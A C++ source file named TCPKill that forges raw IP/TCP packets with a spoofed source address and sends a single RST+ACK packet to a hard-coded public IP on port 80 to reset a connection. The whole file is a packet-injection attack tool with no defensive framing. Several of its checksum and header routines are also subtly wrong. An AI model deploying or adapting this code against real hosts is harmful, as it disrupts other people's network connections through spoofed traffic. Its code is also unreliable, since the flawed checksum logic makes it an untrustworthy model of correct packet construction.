// TCPKill.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

unsigned short checksum_f( const unsigned short *buffer, int length) /* code for checksum */
{
	long sum = 0; /* assume 32 bit long, 16 bit short */
	while (length > 1)
	{
		sum += (*(unsigned short *)buffer)++;
		length -= sizeof (unsigned short);
	}
	if (length)
	{
		sum += (unsigned short) * (unsigned char *) buffer;
	}
	while (sum >> 16)
	{
		sum = (sum & 0xffff) + (sum >> 16);
	}
	return (unsigned short)(~sum);
}

USHORT tcpchecksum(USHORT *buffer, int size)
{ 
	unsigned long cksum=0;
	while(size >1) 
	{
		cksum+=*buffer++;
		size -=sizeof(USHORT);
	}
	if(size)
	{
		cksum += *(UCHAR*)buffer; 
	}
	cksum = (cksum >> 16) + (cksum & 0xffff); 
	cksum += (cksum >>16);
	return (USHORT)(~cksum);
}


struct IP_HEADER       
{ 
	unsigned char	h_lenver;
	unsigned char	tos;           
	unsigned short	total_len;       
	unsigned short	ident;         
	unsigned short	frag_and_flags;
	unsigned char	ttl;           
	unsigned char	proto;
	unsigned short	checksum;       
	unsigned int	sourceIP;       
	unsigned int	destIP;
	void SetIPHeader(int totallen, char protocol, 
		const char *source, const char *dst)
	{
		h_lenver = (4<<4 | sizeof(IP_HEADER) /sizeof(long) );
		tos = 0;
		total_len = totallen;
		ident = 1;
		frag_and_flags = 0x40;
		ttl = 128;
		proto = protocol;
		checksum = 0;
		sourceIP = inet_addr(source);
		destIP = inet_addr(dst);
		
	}
}; 

struct TCP_HEADER : public IP_HEADER
{ 
	USHORT th_sport;             
	USHORT th_dport;             
	unsigned int th_seq;           
	unsigned int th_ack;           
	unsigned char th_lenres;       
	unsigned char th_flag;         
	USHORT th_win;               
	USHORT th_sum;               
	USHORT th_urp;      
	void SetTCPHeader(const char *srcIP, USHORT srcport, const char *destIP, USHORT dstport, int flag )
	{
		th_sport = htons(srcport);
		th_dport = htons(dstport);
		th_seq = htons(0);
		th_ack = 0;
		th_lenres = (20/4 <<4 | 0);
		th_flag = flag;
		th_win = 0;
		th_sum = 0;
		th_urp = 0;
		SetIPHeader(0, IPPROTO_TCP,srcIP, destIP);
	}
};

struct USR_HEADER /* user define header */
{
	unsigned long usr_sa; /* source address */
	unsigned long usr_da; /* dest address */
	unsigned char usr_mbz; 
	unsigned char usr_ptl; /* protocol */
	unsigned short usr_pl; /* protocol lenght */

	void SetUSRHeader(const char *srcip, const char *dstip, int protocol)
	{
		usr_sa = inet_addr(srcip);
		usr_da = inet_addr(dstip);
		usr_mbz = 0;
		usr_ptl = protocol;
		usr_pl = htons( 20 );
	}

};
struct TCP_DATA: public TCP_HEADER
{
	void SetTCPData(const char *data, int len)
	{
		int totallen = len + sizeof(TCP_HEADER);
		total_len = totallen;
		
		setipcksum();
		settcpcksum();
		
	}

	void setipcksum()
	{
		char *packet[1024];
		memcpy(packet, this, sizeof(TCP_HEADER));
		checksum = checksum_f((USHORT *)packet, sizeof(TCP_HEADER));
	}

	void settcpcksum()
	{
		char packet[1024];
		USR_HEADER usr;
		usr.SetUSRHeader("","", IPPROTO_TCP);
		usr.usr_sa = sourceIP;
		usr.usr_da = destIP;
		memcpy(packet, &usr, sizeof(USR_HEADER));
		memcpy(packet + sizeof(USR_HEADER), &th_sport, 20);
		th_sum = tcpchecksum((USHORT*)packet, 20 + sizeof(USR_HEADER));

	}

};




int _tmain(int argc, _TCHAR* argv[])
{
	WSAData wsaData;
	WSAStartup(MAKEWORD(2, 1), &wsaData);
	
	BOOL bFlag = TRUE;

	int iRet, timeout = 6000;

	char *srcip="192.168.1.36";
	char *dstip="221.2.219.66";
	int srcport =6299;
	int dstport = 80;

	SOCKADDR_IN sock_in;
	memset(&sock_in, 0, sizeof sock_in); /* init sockaddr_in structure */
	sock_in.sin_family = AF_INET;                    /* socket family */
	sock_in.sin_addr.S_un.S_addr = inet_addr(dstip); /* dest address */
	sock_in.sin_port = htons((unsigned short)dstport); /* dest port */


	SOCKET sock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_RAW, NULL, 0, 0);
	
	iRet = setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *) & bFlag, sizeof (BOOL));
	if (SOCKET_ERROR == iRet)
	{
		return false;
	}

	iRet = setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char *) & timeout, sizeof (int));
	if (SOCKET_ERROR == iRet)
	{
		return false;
	}
	
	TCP_DATA data;
	data.SetTCPHeader(srcip, srcport, dstip, dstport, 0x14);
	data.SetTCPData(NULL, 0);
	
	iRet = sendto(sock, (char *)&data, sizeof(TCP_DATA), 0, (struct sockaddr*)&sock_in, sizeof(sock_in));
	if (-1 == iRet)

	{

		return false;

	}
	else
	{
		printf("SendOK(%d)\n", iRet);
	}


	return 0;
}

